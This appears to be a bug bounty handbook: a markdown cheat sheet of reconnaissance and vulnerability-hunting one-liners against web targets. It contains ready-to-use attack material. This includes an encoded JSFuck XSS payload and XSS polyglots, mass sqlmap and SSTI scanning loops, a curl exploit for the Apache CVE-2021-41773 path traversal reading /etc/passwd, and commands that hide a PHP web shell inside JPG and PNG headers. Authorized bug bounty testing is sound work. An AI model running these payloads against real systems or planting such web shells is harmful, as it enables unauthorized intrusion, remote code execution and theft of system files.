# Bug Bounty Handbook

- [Resources](#resources)

## Table of Contents

- [Automated Subdomain Monitoring](#automated-subdomain-monitoring)
- [Burp Suite Extensions](#burp-suite-extensions)
- [JavaScript](#javascript)
- [Enumerate Subdomains, Web Servers and API Endpoints](#enumerate-subdomains-web-servers-and-api-endpoints)
- [Find CNAME Records](#find-cname-records)
- [Find hidden Parameters in JavaScript Files](#find-hidden-parameters-in-javascript-files)
- [Find JavaScript Files with gau and httpx](#find-javascript-files-with-gau-and-httpx)
- [Find Open Redirects](#find-open-redirects)
- [Find Secrets in JavaScript Files](#find-secrets-in-javascript-files)
- [Find Subdomains based on Certificates](#find-subdomains-based-on-certificates)
- [Find SQL-Injection (SQLi) at Scale](#find-sql-injection-sqli-at-scale)
- [Find basic SQL-Injection (SQLi), Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI) Vulnerabilities with Magic Payload](#find-basic-sql-injection-sqli-cross-site-scripting-xss-and-server-side-template-injection-ssti-vulnerabilities-with-magic-payload)
- [Find Cross-Site Scripting (XSS) at Scale](#find-cross-site-scripting-xss-at-scale)
- [Find various Vulnerabilities all at ones](#find-various-vulnerabilities-all-at-ones)
- [Fingerprinting with Shodan and Nuclei](#fingerprinting-with-shodan-and-nuclei)
- [Hunting Checklist](#hunting-checklist)
- [Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)](#path-traversal-zero-day-in-apache-http-server-cve-2021-41773)
- [Server-Side Template Injection (SSTI) at Scale](#server-side-template-injection-ssti-at-scale)
- [Target Enrichment](#target-enrichment)
- [Wayback Machine](#wayback-machine)
- [waybackurls](#waybackurls)
- [Web Shell / Malicious Images](#web-shell-malicious-images)
- [Wordpress Configuration Disclosure](#wordpress-configuration-disclosure)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Bug Crowd | Bug Bounty Platform | https://www.bugcrowd.com |
| CrowdStream | CrowdStream is a showcase of accepted and disclosed submissions on participating programs. | https://bugcrowd.com/crowdstream?filter=disclosures |
| disclose.io | We're here to make vulnerability disclosure safe, simple, and standardized for everyone. | https://disclose.io |
| HackerOne | Bug Bounty Platform | https://www.hackerone.com |
| Hacktivity | See the latest hacker activity on HackerOne | https://hackerone.com/hacktivity |
| InfoSecHub | n/a | https://linksshare.io |
| Intigriti | Bug Bounty Platform | https://www.intigriti.com |

## Automated Subdomain Monitoring

> https://github.com/hakluke/haktrails

> https://github.com/tomnomnom/anew

> https://github.com/projectdiscovery/notify

### Installation

```console
$ go install -v github.com/hakluke/haktrails@latest
$ go install -v github.com/tomnomnom/anew@latest
$ go install -v github.com/projectdiscovery/notify/cmd/notify@latest
```

### Configuration

#### haktrails

```console
$ vi ~/.config/haktools/haktrails-config.yml
```

```console
securitytrails:
  key: <API_KEY>
```

#### Notify

```console
$ vi ~/.config/notify/provider-config.yaml
```

```console
slack:
  - id: "slack"
    slack_channel: "recon"
    slack_username: "test"
    slack_format: "{{data}}"
    slack_webhook_url: "https://hooks.slack.com/services/XXXXXX"

  - id: "vulns"
    slack_channel: "vulns"
    slack_username: "test"
    slack_format: "{{data}}"
    slack_webhook_url: "https://hooks.slack.com/services/XXXXXX"

discord:
  - id: "crawl"
    discord_channel: "crawl"
    discord_username: "test"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"

  - id: "subs"
    discord_channel: "subs"
    discord_username: "test"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/XXXXXXXX"

telegram:
  - id: "tel"
    telegram_api_key: "XXXXXXXXXXXX"
    telegram_chat_id: "XXXXXXXX"
    telegram_format: "{{data}}"
    telegram_parsemode: "Markdown" # None/Markdown/MarkdownV2/HTML (https://core.telegram.org/bots/api#formatting-options)

pushover:
  - id: "push"
    pushover_user_key: "XXXX"
    pushover_api_token: "YYYY"
    pushover_format: "{{data}}"
    pushover_devices:
      - "iphone"

smtp:
  - id: email
    smtp_server: mail.example.com
    smtp_username: test@example.com
    smtp_password: password
    from_address: from@email.com
    smtp_cc:
      - to@email.com
    smtp_format: "{{data}}"
    subject: "Email subject"
    smtp_html: false
    smtp_disable_starttls: false

googlechat:
  - id: "gc"
    key: "XXXXXXXX"
    token: "XXXXXX"
    space: "XXXXXX"
    google_chat_format: "{{data}}"

teams:
  - id: "recon"
    teams_webhook_url: "https://<domain>.webhook.office.com/webhookb2/xx@xx/IncomingWebhook/xx"
    teams_format: "{{data}}"

custom:
  - id: webhook
    custom_webhook_url: http://host/api/webhook
    custom_method: GET
    custom_format: '{{data}}'
    custom_headers:
      Content-Type: application/json
      X-Api-Key: XXXXX
      
custom:
  - id: webhookJson
    custom_webhook_url: http://host/api/webhook
    custom_method: GET
    custom_format: '{"text":{{dataJsonString}} }'
    custom_headers:
      Content-Type: application/json
      X-Api-Key: XXXXX

custom:
  - id: webhook
    custom_webhook_url: http://host/api/webhook
    custom_method: GET
    custom_sprig: '{"text":"{{ .url }}"}'
    custom_headers:
      Content-Type: application/json
      X-Api-Key: XXXXX
```

### Monitoring Oneliner

```console
$ while :; do echo <DOMAIN> | haktrails subdomain | anew subdomains.txt; sleep 86400; done | notify
```

## Burp Suite Extensions

* JS Link Finder
* Upload Scanner
* Turbo Intruder
* HTTP Request Smuggler
* Auth Analyzer

## JavaScript

### JSFuck

> http://www.jsfuck.com/

> https://github.com/aemkei/jsfuck

> https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

```javascript
![]                                          // false
!![]                                         // true
[][[]]                                       // undefined
+[![]]                                       // NaN
+[]                                          // 0
+!+[]                                        // 1
!+[]+!+[]                                    // 2
[]                                           // Array
+[]                                          // Number
[]+[]                                        // String
![]                                          // Boolean
[]["filter"]                                 // Function
[]["filter"]["constructor"]( <CODE> )()      // eval
[]["filter"]["constructor"]("<FOOBAR>")()    // window
```

#### Encoded Payload

```javascript
<img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
```

## Enumerate Subdomains, Web Servers and API Endpoints

```console
$ subfinder -d <DOMAIN> -silent | /home/<USERNAME>/go/bin/httpx -silent -o <DOMAIN>_httpx.txt; for i in $(cat <DOMAIN>_httpx.txt); do DOMAIN=$(echo $i | /home/<USERNAME>/go/bin/unfurl format %d); ffuf -u $i/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt -o ${DOMAIN}_ffuf.txt; done
```

## Find CNAME Records

```console
$ for ip in $(cat <FILE>.txt); do dig asxf %ip | grep CNAME; done
```

## Find hidden Parameters in JavaScript Files

```console
$ assetfinder <DOMAIN> | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```

## Find JavaScript Files with gau and httpx

```console
$ echo http://<DOMAIN> | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```

## Find Open Redirects

```console
$ echo "http://<RHOST>" | gau | grep =http | php -r "echo urldecode(file_get_contents('php://stdin'));"
```

## Find Secrets in JavaScript Files

```console
$ subfinder -d <DOMAIN> -silent | /home/<USERNAME>/go/bin/httpx -silent -o <DOMAIN>_httpx.txt; for i in $(cat <DOMAIN>_httpx.txt); do DOMAIN=$(echo $i | /home/<USERNAME>/go/bin/unfurl format %d) | cat <DOMAIN>_httpx.txt | nuclei -t /home/<USERNAME>/opt/03_web_application_analysis/nuclei-templates/exposures/tokens -o token-expose.txt; done
```

## Find Subdomains based on Certificates

```console
$ curl -s https://crt.sh/\?q\=<DOMAIN>\&output\=json | jq . | grep 'name_value' | awk '{print $2}' | sed -e 's/"//g'| sed -e 's/,//g' | awk '{gsub(/\\n/,"\n")}1' | sort -u
```

## Find SQL-Injection (SQLi) at Scale

```console
$ subfinder -d <DOMAIN> -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a <FILE>
$ cat <FILE> | gf sqli | tee -a <FILE>
$ while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < <FILE>
```

## Find basic SQL-Injection (SQLi), Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI) Vulnerabilities with Magic Payload

```console
'"><svg/onload=alert()>{{7*7}}
```

## Find Cross-Site Scripting (XSS) at Scale

### XSStrike

> https://github.com/s0md3v/XSStrike

> https://github.com/lc/gau

> https://github.com/projectdiscovery/katana

```console
$ echo <DOMAIN> | gau | while read url; do python3 xsstrike.py -u $url --crawl -l 4 -d 5; done
$ echo <DOMAIN> | katana | while read url; do python3 xsstrike.py -u $url --crawl -l 4; done
```

```console
$ subfinder -d <DOMAIN> -all -silent | httpx -silent | katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
```

## Find various Vulnerabilities all at ones

### Prerequisistes

#### Install waybackurls

```console
$ go install github.com/tomnomnom/waybackurls@latest
```

#### Install uro

```console
$ pipx install uro
```

### Execution

First perform `Google Dorking` on your target.

```console
site:*.<DOMAIN> ext:php
```

```console
$ echo <SUBDOMAIN>.<DOMAIN> | waybackurls | grep "\?" | uro | httpx -silent > parameters.txt
```

```console
$ nuclei -l parameters.txt -t /PATH/TO/TEMPLATES/nuclei-templates/
```

## Fingerprinting with Shodan and Nuclei

```console
$ shodan domain <DOMAIN> | awk '{print $3}' | httpx -silent | nuclei -t /PATH/TO/TEMPLATES/nuclei-templates/
```

## Hunting Checklist

### Domains

1. Find Subdomains
2. Check `CNAME Records` of those subdomains and check for `Subdomain Takeover`
* Use `WaybackUrls` for URLs
3. Use `MassScan` for `Port Scanning`
4. Do `Github` recon

### Web Applications

5. Check for `CORS Misconfiguration`
6. Check for `Email Header Injection` on `Password Reset Function`
7. Check for `SMTP` and `HOST Header Injection`
8. Check for `IFRAMEs (Clickjacking)`
9. Check for `Improper Access Control` and `Paramter Tampering`
10. Check `Burp History` for finding endpoint
11. Use `Arjun` for finding hidden endpoints
12. Check for `Client-Side Request Forgery (CSRF)`
13. Check for `Server-Side Request Forgery (SSRF) Parameters`
14. Check for `Cross-Site Scripting (XSS)` and `Server-Side Template Injection (SSTI)`
15. Check `Cryptography` in `Reset Password Token`
16. Check for `Unicode Injection` in `Email Parameters`
17. Check for `Bypassing Rate Limits`

#### Headers

X-Originating-IP:IP
X-Forwarded-For:IP
X-Remote-IP:IP
X-Remote-Addr:IP
X-Client-IP:IP
X-Forwarded-Host:IP

18. Perform `Directory Busting`
19. Check for `HTTP Request Smuggling`
20. Check for `Open Redirect` through `WaybackUrls`
21. Check for `Social-Signon Bypass`
22. Check for `state parameter` in `Social Sign-In` & check whether it's possible to cause `Denial of Service (DoS)` using `Multiple Cookie Injection`
23. Check for `File Upload`: CSRF, XSS, SSRF, RCE, LFI, XXE
24. Check for `Buffer Overflow`

## Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)

```console
$ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

## Server-Side Template Injection (SSTI) at Scale

```console
$ echo "<DOMAIN>" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/hostname').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```

## Target Enrichment

### Prerequisites

#### Katana

```console
$ CGO_ENABLED=1 go install github.com/projectdiscovery/katana/cmd/katana@latest
```

#### httpx

```console
$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

#### Nuclei

```console
$ go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

#### Execution

```console
$ katana -u <URL> -hl -jc --no-sandbox -c 1 -p 1 -rd 3 -rl 5 -H "User-Agent: $(shuf -n 1 -e 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 'Mozilla/5.0 (x11; Linux x86_64)' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)')" | httpx -silent -status-code -follow-redirects -tls-probe -random-agent -fr | nuclei -headless -sresp -rate-limit 25 -concurrency 20 -severity critical,high,medium -tags login,auth,exposure,api -markdown-export output/ -H "User-Agent: $(shuf -n 1 -e 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 'Mozilla/5.0 (x11; Linux x86_64)' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)')" -tlsi -stats
```

## Wayback Machine

### Password Search

1. Access https://web.archive.org/
2. Type in the desired domain
3. Switch to the URL tab https://web.archive.org/web/*/https://<DOMAIN>*
4. Apply the filter `%40`

## waybackurls

> https://github.com/tomnomnom/waybackurls

```console
$ waybackurls <DOMAIN> | grep - -color -E "1.xls | \\.tar.gz | \\.bak | \\.xml | \\.xlsx | \\.json | \\.rar | \\.pdf | \\.sql | \\.doc | \\.docx | \\.pptx | \\.txt | \\.zip | \\.tgz | \\.7z"
```

## Web Shell / Malicious Images

```console
$ echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > <FILE>.jpg
$ echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > <FILE>.png
```

## Wordpress Configuration Disclosure

```console
$ subfinder -silent -d http://<DOMAIN> | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60
```

## Cross-Site Scripting (XSS)

### Ployglot Payload

Note that `HTML tags` that need to be closed for `XSS`.

```console
<!--
<title>
<textarea>
<style>
<noscript>
<xmp>
<template>
<noembed>
```

```console
--></title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert()>
```

### Single Domain One-liner

```console
$ echo https://<DOMAIN>/ | gau | gf xss | uro | Gxss | kxss | tee <FILE>.txt
```
